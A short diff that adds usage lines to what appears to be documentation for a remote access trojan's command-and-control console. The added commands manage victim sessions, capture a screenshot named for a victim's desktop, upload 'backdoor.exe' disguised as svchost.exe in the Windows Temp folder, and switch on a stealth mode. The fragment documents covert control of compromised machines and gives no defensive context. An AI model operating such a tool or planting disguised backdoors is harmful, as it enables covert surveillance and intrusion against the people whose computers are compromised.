@@ -29,3 +29,19 @@ RAT> kill
 
 # Exit C2
 RAT> exit
+
+# List active sessions
+RAT> sessions
+
+# Switch to specific session
+RAT> switch abc123
+
+# Take screenshot with custom name
+RAT> screenshot victim_desktop.jpg
+
+# Upload with verification
+RAT> upload backdoor.exe C:\\Windows\\Temp\\svchost.exe
+
+# Enable stealth mode
+RAT> stealth on
+
